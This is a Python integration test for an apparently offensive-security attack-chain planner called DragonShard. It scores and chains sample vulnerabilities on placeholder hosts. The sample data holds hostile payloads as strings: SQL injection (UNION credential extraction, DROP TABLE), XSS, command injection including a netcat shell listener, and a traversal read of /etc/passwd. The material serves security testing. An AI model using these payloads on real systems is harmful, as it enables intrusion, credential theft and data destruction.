#!/usr/bin/env python3
"""
DragonShard Chain Planner Integration Test

Demonstrates the chain planner functionality with real vulnerability data
and shows how it integrates with the fuzzing and reconnaissance modules.
"""

import sys
import os
import json
import logging
from typing import List, Dict, Any

# Add the project root to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from dragonshard.planner.chain_planner import (
    ChainPlanner, Vulnerability, AttackType, AttackComplexity, 
    AttackImpact, AttackChain
)
from dragonshard.planner.attack_strategies import AttackStrategies
from dragonshard.planner.vulnerability_prioritization import VulnerabilityPrioritizer


def setup_logging():
    """Set up logging configuration."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )


def create_sample_vulnerabilities() -> List[Vulnerability]:
    """Create sample vulnerabilities for testing."""
    vulnerabilities = [
        # SQL Injection vulnerabilities
        Vulnerability(
            target_url="http://vulnerable-webapp.com/search.php",
            vulnerability_type=AttackType.SQL_INJECTION,
            payload="' OR 1=1--",
            confidence=0.95,
            evidence="MySQL syntax error: You have an error in your SQL syntax",
            impact=AttackImpact.HIGH,
            complexity=AttackComplexity.MEDIUM,
            exploitability=0.9,
            description="SQL injection vulnerability in search parameter",
            remediation="Use parameterized queries and input validation"
        ),
        Vulnerability(
            target_url="http://vulnerable-webapp.com/login.php",
            vulnerability_type=AttackType.SQL_INJECTION,
            payload="' UNION SELECT username,password FROM users--",
            confidence=0.85,
            evidence="Database error and user data returned",
            impact=AttackImpact.CRITICAL,
            complexity=AttackComplexity.MEDIUM,
            exploitability=0.8,
            description="SQL injection in login form with data extraction",
            remediation="Implement proper authentication and use parameterized queries"
        ),
        
        # XSS vulnerabilities
        Vulnerability(
            target_url="http://vulnerable-webapp.com/comment.php",
            vulnerability_type=AttackType.XSS,
            payload="<script>alert('XSS')</script>",
            confidence=0.8,
            evidence="JavaScript alert executed in browser",
            impact=AttackImpact.MEDIUM,
            complexity=AttackComplexity.LOW,
            exploitability=0.7,
            description="Reflected XSS vulnerability in comment form",
            remediation="Implement output encoding and Content Security Policy"
        ),
        Vulnerability(
            target_url="http://vulnerable-webapp.com/profile.php",
            vulnerability_type=AttackType.XSS,
            payload="<img src=x onerror=alert('XSS')>",
            confidence=0.75,
            evidence="Image onerror event triggered",
            impact=AttackImpact.MEDIUM,
            complexity=AttackComplexity.LOW,
            exploitability=0.6,
            description="Stored XSS vulnerability in profile page",
            remediation="Sanitize user input and implement CSP"
        ),
        
        # Command Injection vulnerabilities
        Vulnerability(
            target_url="http://vulnerable-webapp.com/upload.php",
            vulnerability_type=AttackType.COMMAND_INJECTION,
            payload="; ls -la",
            confidence=0.9,
            evidence="Directory listing returned in response",
            impact=AttackImpact.CRITICAL,
            complexity=AttackComplexity.HIGH,
            exploitability=0.9,
            description="Command injection in file upload functionality",
            remediation="Avoid command execution and implement proper file handling"
        ),
        Vulnerability(
            target_url="http://vulnerable-webapp.com/system.php",
            vulnerability_type=AttackType.COMMAND_INJECTION,
            payload="&& whoami",
            confidence=0.85,
            evidence="Current user information returned",
            impact=AttackImpact.CRITICAL,
            complexity=AttackComplexity.HIGH,
            exploitability=0.8,
            description="Command injection in system management interface",
            remediation="Remove command execution capabilities and use secure APIs"
        ),
        
        # Authentication Bypass vulnerabilities
        Vulnerability(
            target_url="http://vulnerable-webapp.com/admin/",
            vulnerability_type=AttackType.AUTHENTICATION_BYPASS,
            payload="admin' OR '1'='1",
            confidence=0.8,
            evidence="Admin access granted without proper credentials",
            impact=AttackImpact.HIGH,
            complexity=AttackComplexity.MEDIUM,
            exploitability=0.8,
            description="Authentication bypass in admin panel",
            remediation="Implement proper session management and authentication"
        ),
        
        # Path Traversal vulnerabilities
        Vulnerability(
            target_url="http://vulnerable-webapp.com/file.php",
            vulnerability_type=AttackType.PATH_TRAVERSAL,
            payload="../../../etc/passwd",
            confidence=0.7,
            evidence="System file contents returned",
            impact=AttackImpact.HIGH,
            complexity=AttackComplexity.MEDIUM,
            exploitability=0.6,
            description="Path traversal vulnerability in file access",
            remediation="Implement proper path validation and use whitelist approach"
        )
    ]
    
    return vulnerabilities


def create_sample_target_information() -> Dict[str, Any]:
    """Create sample target information from reconnaissance."""
    return {
        "vulnerable-webapp.com": {
            "open_ports": [80, 443, 22, 3306],
            "services": {
                "80": "Apache/2.4.41",
                "443": "Apache/2.4.41 (SSL)",
                "22": "OpenSSH 8.2p1",
                "3306": "MySQL 5.7.32"
            },
            "technologies": ["PHP 7.4", "MySQL 5.7", "Apache 2.4"],
            "endpoints": [
                "/search.php",
                "/login.php", 
                "/comment.php",
                "/profile.php",
                "/upload.php",
                "/system.php",
                "/admin/",
                "/file.php"
            ],
            "vulnerabilities_found": 8,
            "risk_level": "HIGH"
        }
    }


def demonstrate_chain_planner():
    """Demonstrate the chain planner functionality."""
    print("🔍 DragonShard Chain Planner Integration Test")
    print("=" * 50)
    
    # Initialize components
    planner = ChainPlanner()
    strategies = AttackStrategies()
    prioritizer = VulnerabilityPrioritizer()
    
    # Create sample data
    vulnerabilities = create_sample_vulnerabilities()
    target_info = create_sample_target_information()
    
    print(f"📊 Loaded {len(vulnerabilities)} sample vulnerabilities")
    print(f"🎯 Loaded {len(target_info)} target information records")
    
    # Add vulnerabilities to planner
    for vuln in vulnerabilities:
        planner.add_vulnerability(vuln)
    
    # Add target information
    for host, info in target_info.items():
        planner.add_target_information(host, info)
    
    print("\n🔍 Vulnerability Analysis")
    print("-" * 30)
    
    # Analyze vulnerabilities
    analysis = planner.analyze_vulnerabilities()
    print(f"Total vulnerabilities: {analysis['total_vulnerabilities']}")
    print(f"Vulnerability types: {analysis['vulnerability_types']}")
    print(f"High risk targets: {len(analysis['high_risk_targets'])}")
    
    # Show attack opportunities
    print(f"\nAttack opportunities found: {len(analysis['attack_opportunities'])}")
    for opportunity in analysis['attack_opportunities']:
        print(f"  - {opportunity['target']}: {opportunity['vulnerability_count']} vulns, "
              f"Risk score: {opportunity['risk_score']:.2f}")
    
    print("\n🎯 Vulnerability Prioritization")
    print("-" * 30)
    
    # Prioritize vulnerabilities
    scored_vulns = prioritizer.prioritize_vulnerabilities(vulnerabilities)
    
    print("Top 5 vulnerabilities by risk:")
    for i, vuln_score in enumerate(scored_vulns[:5]):
        print(f"  {i+1}. {vuln_score.vulnerability.vulnerability_type.value} "
              f"({vuln_score.vulnerability.target_url})")
        print(f"     Risk Score: {vuln_score.risk_score:.2f} ({vuln_score.risk_level.value})")
        print(f"     Business Impact: {vuln_score.business_impact}")
        print(f"     Estimated Time: {vuln_score.estimated_time_to_exploit} minutes")
        print()
    
    print("\n⚡ Attack Chain Generation")
    print("-" * 30)
    
    # Generate attack chains
    chains = planner.generate_attack_chains()
    print(f"Generated {len(chains)} attack chains")
    
    # Show top chains
    print("\nTop attack chains:")
    for i, chain in enumerate(chains[:3]):
        print(f"  {i+1}. {chain.chain_name}")
        print(f"     Impact: {chain.total_impact.value}")
        print(f"     Complexity: {chain.total_complexity.value}")
        print(f"     Success Probability: {chain.success_probability:.2f}")
        print(f"     Estimated Duration: {chain.estimated_duration // 60} minutes")
        print(f"     Steps: {len(chain.attack_steps)}")
        print()
    
    print("\n📋 Attack Strategies")
    print("-" * 30)
    
    # Show available strategies
    all_strategies = strategies.get_all_strategies()
    print(f"Available attack strategies: {len(all_strategies)}")
    
    for strategy in all_strategies[:3]:  # Show first 3
        print(f"  - {strategy.name}")
        print(f"    Type: {strategy.strategy_type.value}")
        print(f"    Duration: {strategy.estimated_duration} minutes")
        print(f"    Risk Level: {strategy.risk_level.value}")
        print()
    
    print("\n📊 Planning Summary")
    print("-" * 30)
    
    # Get planning summary
    summary = planner.get_planning_summary()
    print(f"Total vulnerabilities: {summary['total_vulnerabilities']}")
    print(f"Total attack chains: {summary['total_chains']}")
    print(f"Targets analyzed: {summary['targets_analyzed']}")
    print(f"High-risk chains: {summary['high_risk_chains']}")
    print(f"Average success probability: {summary['average_success_probability']:.2f}")
    
    print("\n🔧 Recommendations:")
    for rec in summary['recommendations']:
        print(f"  - {rec}")
    
    print("\n💾 Exporting Results")
    print("-" * 30)
    
    # Export results
    try:
        planner.export_chains("attack_chains_export.json")
        print("✅ Attack chains exported to attack_chains_export.json")
        
        strategies.export_strategies("attack_strategies_export.json")
        print("✅ Attack strategies exported to attack_strategies_export.json")
        
        # Generate prioritization report
        report = prioritizer.generate_prioritization_report(vulnerabilities)
        with open("vulnerability_report.json", "w") as f:
            json.dump(report, f, indent=2)
        print("✅ Vulnerability report exported to vulnerability_report.json")
        
    except Exception as e:
        print(f"❌ Export failed: {e}")
    
    print("\n🎉 Chain Planner Integration Test Complete!")
    print("=" * 50)


def demonstrate_advanced_features():
    """Demonstrate advanced planner features."""
    print("\n🚀 Advanced Features Demonstration")
    print("=" * 50)
    
    planner = ChainPlanner()
    prioritizer = VulnerabilityPrioritizer()
    
    # Create focused test data
    critical_vulns = [
        Vulnerability(
            target_url="http://critical-app.com/admin/shell.php",
            vulnerability_type=AttackType.COMMAND_INJECTION,
            payload="; nc -l 4444 -e /bin/sh",
            confidence=0.95,
            evidence="Reverse shell connection established",
            impact=AttackImpact.CRITICAL,
            complexity=AttackComplexity.HIGH,
            exploitability=0.95,
            description="Critical RCE vulnerability in admin interface",
            remediation="Remove command execution and implement secure APIs"
        ),
        Vulnerability(
            target_url="http://critical-app.com/db/query.php",
            vulnerability_type=AttackType.SQL_INJECTION,
            payload="'; DROP TABLE users; --",
            confidence=0.9,
            evidence="Database structure modified",
            impact=AttackImpact.CRITICAL,
            complexity=AttackComplexity.MEDIUM,
            exploitability=0.9,
            description="Critical SQL injection with data destruction capability",
            remediation="Use parameterized queries and implement proper access controls"
        )
    ]
    
    print("🔴 Critical Vulnerability Analysis")
    print("-" * 30)
    
    for vuln in critical_vulns:
        planner.add_vulnerability(vuln)
        risk_score = prioritizer.calculate_risk_score(vuln)
        risk_level = prioritizer.determine_risk_level(risk_score)
        time_to_exploit = prioritizer.estimate_time_to_exploit(vuln)
        
        print(f"Vulnerability: {vuln.vulnerability_type.value}")
        print(f"  Target: {vuln.target_url}")
        print(f"  Risk Score: {risk_score:.2f} ({risk_level.value})")
        print(f"  Time to Exploit: {time_to_exploit} minutes")
        print(f"  Business Impact: {prioritizer.assess_business_impact(vuln)}")
        print()
    
    # Generate focused attack chains
    chains = planner.generate_attack_chains()
    
    print("⚡ Critical Attack Chains")
    print("-" * 30)
    
    for chain in chains:
        print(f"Chain: {chain.chain_name}")
        print(f"  Impact: {chain.total_impact.value}")
        print(f"  Success Probability: {chain.success_probability:.2f}")
        print(f"  Duration: {chain.estimated_duration // 60} minutes")
        print(f"  Risk Assessment: {chain.risk_assessment}")
        print()
        
        # Show attack steps
        for step in chain.attack_steps:
            print(f"    Step: {step.step_name}")
            print(f"      Target: {step.target_url}")
            print(f"      Expected: {step.expected_outcome}")
            print(f"      Time: {step.estimated_time} seconds")
            print()


def main():
    """Main function to run the integration test."""
    setup_logging()
    
    try:
        demonstrate_chain_planner()
        demonstrate_advanced_features()
        
        print("\n✅ All tests completed successfully!")
        print("\n📁 Generated files:")
        print("  - attack_chains_export.json")
        print("  - attack_strategies_export.json") 
        print("  - vulnerability_report.json")
        
    except Exception as e:
        print(f"❌ Integration test failed: {e}")
        logging.error(f"Integration test error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main() 